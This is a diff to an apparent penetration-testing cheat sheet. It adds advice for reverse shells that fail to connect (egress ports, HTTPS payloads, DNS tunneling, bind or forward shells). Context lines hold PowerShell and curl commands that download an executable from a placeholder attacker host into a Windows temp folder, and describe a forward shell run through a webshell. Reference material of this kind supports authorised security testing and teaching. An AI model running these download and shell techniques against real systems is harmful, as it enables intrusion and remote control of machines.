@@ -530,6 +530,8 @@ powershell -c "iwr http://<ATTACKER_IP>/p.exe -OutFile C:\Windows\Temp\p.exe"
 curl http://<ATTACKER_IP>/p.exe -o C:\Windows\Temp\p.exe
 ```
 
+> **Reverse shell didn't connect?** Before jumping to forward-shell: (1) retry on common egress ports 80/443/53; (2) if only HTTP/S exits, use `reverse_https` payloads; (3) if only DNS exits, see tunneling-pivoting.md DNS tunneling; (4) if NO outbound at all, use Forward Shell or Bind Shell below.
+
 ### Forward Shell (Egress-Blocked Environments)
 
 When the target blocks all outbound connections (no reverse shell possible) and inbound ports are filtered (no bind shell), a forward shell polls commands through an existing webshell using named pipes. The attacker drives the interaction from their box; the target never initiates a connection.
